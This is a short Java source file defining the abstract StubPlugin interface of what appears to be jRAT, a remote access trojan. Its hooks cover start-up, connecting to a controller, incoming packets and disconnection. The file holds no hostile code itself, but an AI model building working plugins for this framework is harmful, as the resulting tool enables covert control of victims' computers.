package pro.jrat.api.stub;

import java.io.DataInputStream;
import java.io.DataOutputStream;

public abstract class StubPlugin {
	
	/**
	 * 
	 * @return The name of this plugin (Not needed)
	 */
	public String getName() {
		return "Unknown";
	}
	
	/**
	 * Called when jRAT is launched
	 */
	public abstract void onStart() throws Exception;
	
	/**
	 * When we loose connection to controller and the reason
	 * @param ex
	 * @throws Exception
	 */
	public abstract void onDisconnect(Exception ex) throws Exception;
	
	/**
	 * When we connect
	 * @param dis
	 * @param dos
	 * @throws Exception
	 */
	public abstract void onConnect(DataInputStream dis, DataOutputStream dos) throws Exception;
	
	/**
	 * Incoming packet, we get the header
	 * @param header
	 * @throws Exception
	 */
	public abstract void onPacket(byte header) throws Exception;
	
	/**
	 * When the Stub starts
	 * @throws Exception
	 */
	public abstract void onEnable() throws Exception;
}